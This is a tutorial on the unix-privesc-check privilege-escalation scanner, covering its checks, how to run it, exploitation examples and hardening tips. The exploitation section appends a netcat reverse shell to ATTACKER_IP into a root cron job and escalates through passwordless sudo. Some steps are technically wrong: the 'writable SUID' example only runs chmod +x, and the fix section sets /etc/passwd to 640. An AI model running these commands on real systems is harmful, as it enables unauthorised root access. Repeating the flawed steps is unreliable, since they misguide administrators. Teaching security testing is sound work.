![unix-privesc-check.png](https://github.com/aw-junaid/Kali-Linux/blob/main/Kali%20Linux%20Tools/Images/Vulnerability%20Analysis%20Tools/unix-privesc-check.png)

`unix-privesc-check` (or often referred to as just "privesc-check") is a script designed to help identify potential privilege escalation vulnerabilities on Unix-like systems (Linux, macOS, BSD, etc.). It automates the process of checking for common misconfigurations and weaknesses that could allow a regular user to gain root or other elevated privileges.

**What `unix-privesc-check` Does:**

The script performs a variety of checks, including:

*   **Weak File Permissions:** Checks for files and directories with overly permissive permissions that could be exploited.
*   **SUID/SGID Binaries:** Identifies SUID (Set User ID) and SGID (Set Group ID) binaries that might be vulnerable.
*   **Writable Paths:** Checks for directories in the `PATH` environment variable that are writable by regular users.
*   **Unsafe Library Paths:** Looks for insecure library paths that could allow loading of malicious libraries.
*   **Cron Jobs:** Examines cron jobs for potential weaknesses (e.g., writable scripts run by root).
*   **Capabilities:** Checks for excessive or dangerous Linux capabilities assigned to users or binaries.
*   **Kernel Exploits:** (Sometimes) May include checks for known kernel vulnerabilities (though this is less common).
*   **Systemd Services:** Checks for misconfigurations in systemd services.
*   **Other Checks:**  The script often includes checks for other potential privilege escalation vectors.

**Key Features and Capabilities:**

*   **Automated Checks:** Automates many common privilege escalation checks.
*   **Comprehensive:** Covers a wide range of potential vulnerabilities.
*   **Easy to Use:** Typically a single script that can be run with minimal configuration.
*   **Customizable (Sometimes):** Some versions may allow for some customization.

**How to Use `unix-privesc-check`:**

  **Obtain the Script:** You can usually find `unix-privesc-check` scripts on GitHub or other security resources websites. Search for "privesc-check" or "unix-privesc-check."  There are multiple versions available, so choose one that is well-maintained and has the features you need.

  **Make it Executable:**

    ```bash
    chmod +x privesc-check.sh  # Replace privesc-check.sh with the actual filename
    ```

  **Run the Script:**

```bash
./privesc-check.sh
```


You'll likely need to run it as a regular user first.  Some checks might require root privileges, and the script will usually tell you if that's the case.

---

### **üîπ Run a Detailed Scan (Thorough)**
```bash
./unix-privesc-check detailed
```
‚úî This mode **deeply analyzes** file permissions, **open file handles**, and **shared object (SO) files** but may **generate false positives**.

---

### **üîπ Save Results for Analysis**
```bash
./unix-privesc-check standard > privesc-results.txt
cat privesc-results.txt | grep WARNING
```
‚úî Searches for **vulnerabilities** in the results.

---

## **üî• Exploiting Findings (Example Scenarios)**  
### **1Ô∏è‚É£ Writable SUID Binary (Privilege Escalation)**
If a binary has **SUID (Set-User-ID) permissions**, it might allow privilege escalation:  
```bash
ls -l /path/to/binary
# If it's world-writable:
chmod +x /path/to/binary  # Modify it
./binary  # Execute to check privilege escalation
```

---

### **2Ô∏è‚É£ Root-Owned Cron Job Modification**
If a cron job executed by root is **writable**, you can add a **reverse shell**:
```bash
echo "nc -e /bin/bash ATTACKER_IP 4444" >> /etc/cron.hourly/root_job
```

---

### **3Ô∏è‚É£ Exploiting Sudo Misconfiguration**
Check sudo permissions:
```bash
sudo -l
```
If you can run a command as root **without a password**, try:
```bash
sudo /bin/bash
```

---

## **üîí Fix Issues (For System Admins)**
- **Remove unnecessary SUID bits**:  
  ```bash
  chmod -s /path/to/vulnerable-binary
  ```
- **Secure file permissions**:  
  ```bash
  chmod 600 /etc/shadow
  chmod 640 /etc/passwd
  ```
- **Restrict sudo privileges** in `/etc/sudoers`.  
- **Disable SSH root login** by setting `PermitRootLogin no` in `/etc/ssh/sshd_config`.  
- **Remove writable cron jobs** that can be modified by users.  

---

**Important Considerations:**

*   **Multiple Versions:**  Be aware that there are different versions of `unix-privesc-check` available. They may have different checks and output formats.
*   **No Guarantees:** The script is a helpful tool, but it doesn't guarantee that it will find all possible privilege escalation vulnerabilities.  Manual review and testing are still important.
*   **False Positives:** The script may sometimes report false positives. It's essential to verify the findings.
*   **Updates:**  Privilege escalation techniques are constantly evolving.  Try to use a reasonably up-to-date version of the script.
*   **Root Checks:** Some checks require root privileges.  The script will usually tell you when to re-run it as root.
*   **Customization:** Some versions of the script might allow you to customize the checks that are performed.

